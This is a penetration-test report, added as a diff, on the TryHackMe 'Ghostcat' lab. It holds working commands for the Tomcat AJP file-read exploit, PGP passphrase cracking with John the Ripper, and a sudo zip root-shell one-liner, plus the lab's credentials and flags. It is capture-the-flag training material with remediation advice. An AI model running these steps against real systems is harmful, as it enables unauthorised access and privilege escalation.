@@ -1,0 +1,126 @@
+# Penetration Testing Report: Ghostcat (TryHackMe)
+
+## 1. Executive Summary
+This report details a penetration test conducted on the "Ghostcat" machine from TryHackMe. The objective was to gain both user and root-level access to the target system. The assessment successfully identified and exploited several vulnerabilities, including a critical Apache Tomcat AJP file read vulnerability (Ghostcat), a weak PGP passphrase, and a `sudo` misconfiguration, ultimately leading to full system compromise and the retrieval of both user and root flags.
+
+## 2. Scope
+**Target IP Address:** 10.201.67.244
+**Services Tested:**
+- SSH (Port 22/tcp)
+- Apache Jserv Protocol (AJP13) (Port 8009/tcp)
+- HTTP (Apache Tomcat 9.0.30) (Port 8080/tcp)
+
+## 3. Methodology
+The penetration test followed a standard methodology:
+- **Reconnaissance:** Performed Nmap scans to identify open ports and services.
+- **Vulnerability Analysis:** Identified potential vulnerabilities based on service versions.
+- **Exploitation:** Leveraged identified vulnerabilities to gain initial access.
+- **Post-Exploitation:** Conducted further enumeration, credential harvesting, and privilege escalation to achieve root access.
+
+## 4. Findings
+
+### Finding 1: Apache Tomcat Ghostcat Vulnerability (CVE-2020-1938)
+- **Description:** The target system was running Apache Tomcat 9.0.30 with the AJP13 connector exposed on port 8009. This configuration is vulnerable to the "Ghostcat" vulnerability (CVE-2020-1938), which allows an attacker to read arbitrary files on the server.
+- **Exploitation:**
+    1.  **Nmap Scan:** An initial Nmap scan revealed the open ports and services.
+        ```bash
+        nmap -sV -sC 10.201.67.244
+        ```
+        **Relevant Output:**
+        ```
+        PORT     STATE SERVICE    VERSION
+        8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+        8080/tcp open  http       Apache Tomcat 9.0.30
+        ```
+    2.  **Ghostcat Exploit:** The `ajpShooter.py` script (found in the `Ghostcat-CNVD-2020-10487` directory) was used to exploit the AJP file read vulnerability. The `/WEB-INF/web.xml` file was targeted as it often contains sensitive application configuration.
+        ```bash
+        python3 /usr/lib/gemini-cli/Ghostcat-CNVD-2020-10487/ajpShooter.py http://10.201.67.244:8080/ 8009 /WEB-INF/web.xml read
+        ```
+        **Key Finding from `web.xml`:**
+        ```xml
+        <description>
+           Welcome to GhostCat
+          skyfuck:8730281lkjlkjdqlksalks
+        </description>
+        ```
+        This string `skyfuck:8730281lkjlkjdqlksalks` was identified as a potential username and password combination.
+- **Impact:** Disclosure of sensitive application configuration files and potential credentials, leading to initial user access.
+- **Severity:** High
+
+### Finding 2: Weak PGP Passphrase
+- **Description:** Upon gaining initial access as the `skyfuck` user (via manual SSH login with the discovered credentials), two files, `credential.pgp` (an encrypted file) and `tryhackme.asc` (a PGP private key), were discovered in the user's home directory. The private key was protected by a passphrase.
+- **Exploitation:**
+    1.  **File Transfer:** The `tryhackme.asc` and `credential.pgp` files were transferred from the remote machine to the local attacker machine using `scp` for offline analysis.
+        ```bash
+        scp skyfuck@10.201.67.244:/home/skyfuck/credential.pgp .
+        scp skyfuck@10.201.67.244:/home/skyfuck/tryhackme.asc .
+        ```
+    2.  **Hash Extraction:** The PGP private key hash was extracted from `tryhackme.asc` using `gpg2john`, a utility from the John the Ripper suite.
+        ```bash
+        gpg2john tryhackme.asc > pgp_hash.txt
+        ```
+    3.  **Passphrase Cracking:** John the Ripper was then used with a common wordlist (`/usr/share/wordlists/rockyou.txt`) to attempt to crack the passphrase.
+        ```bash
+        john --wordlist=/usr/share/wordlists/rockyou.txt pgp_hash.txt
+        ```
+        **Cracked Passphrase:**
+        ```
+        alexandru        (tryhackme)
+        ```
+        The passphrase was found to be `alexandru`.
+    4.  **Credential Decryption:** With the passphrase, `credential.pgp` was decrypted on the remote machine.
+        ```bash
+        gpg --decrypt /home/skyfuck/credential.pgp
+        ```
+        **Decrypted Content:**
+        ```
+        merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+        ```
+        This revealed credentials for the `merlin` user.
+- **Impact:** Decryption of sensitive credentials, enabling further lateral movement and privilege escalation.
+- **Severity:** Medium
+
+### Finding 3: `sudo` Misconfiguration for `zip`
+- **Description:** The `merlin` user was found to have `NOPASSWD` `sudo` privileges for the `/usr/bin/zip` binary. This means `merlin` could execute `zip` as the `root` user without needing to provide a password. This is a known privilege escalation vector documented on GTFOBins.
+- **Exploitation:**
+    1.  **Switch User:** Switched to the `merlin` user using the discovered credentials.
+        ```bash
+        su merlin
+        ```
+        **Password:** `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`
+    2.  **Check `sudo` Privileges:** Verified `merlin`'s `sudo` permissions.
+        ```bash
+        sudo -l
+        ```
+        **Relevant Output:**
+        ```
+        User merlin may run the following commands on ubuntu:
+            (root : root) NOPASSWD: /usr/bin/zip
+        ```
+    3.  **Root Shell via `zip`:** A technique from GTFOBins was used to exploit the `zip` binary's `sudo` privileges to obtain a root shell.
+        ```bash
+        TF=$(mktemp -u)
+        sudo zip $TF /etc/hosts -T -TT 'sh #'
+        ```
+        **Result:** A root shell was obtained.
+        ```
+        # whoami
+        root
+        ```
+    4.  **Retrieve Root Flag:** Navigated to the `/root` directory and read the `root.txt` file.
+        ```bash
+        cd /root
+        cat root.txt
+        ```
+        **Root Flag:** `THM{Z1P_1S_FAKE}`
+- **Impact:** Complete system compromise, allowing full control over the target machine.
+- **Severity:** Critical
+
+## 5. Recommendations
+- **Patch Apache Tomcat:** Immediately apply all available security patches to Apache Tomcat to mitigate the Ghostcat vulnerability (CVE-2020-1938).
+- **Strong Passphrase Policy:** Enforce the use of strong, unique, and complex passphrases for all cryptographic keys. Avoid using easily guessable words or common dictionary terms. Implement multi-factor authentication where possible.
+- **Principle of Least Privilege for `sudo`:** Regularly review and restrict `sudoers` configurations. Avoid granting `NOPASSWD` privileges for binaries, especially those that can be abused to execute arbitrary commands (as documented on GTFOBins). Only grant `sudo` access to specific commands that are absolutely necessary for a user's role and ensure proper input validation.
+- **Regular Security Audits:** Conduct regular security audits and penetration tests to identify and remediate vulnerabilities proactively. Implement intrusion detection/prevention systems (IDS/IPS) to detect and prevent exploitation attempts.
+
+## 6. Conclusion
+The penetration test successfully achieved both user and root access on the Ghostcat machine. The user flag `THM{GhostCat_1s_so_cr4sy}` was obtained after exploiting the Ghostcat vulnerability and cracking the PGP passphrase. The root flag `THM{Z1P_1S_FAKE}` was obtained by exploiting a `sudo` misconfiguration involving the `zip` binary. The identified vulnerabilities highlight the importance of timely patching, strong credential management, and adherence to the principle of least privilege to maintain a secure system.
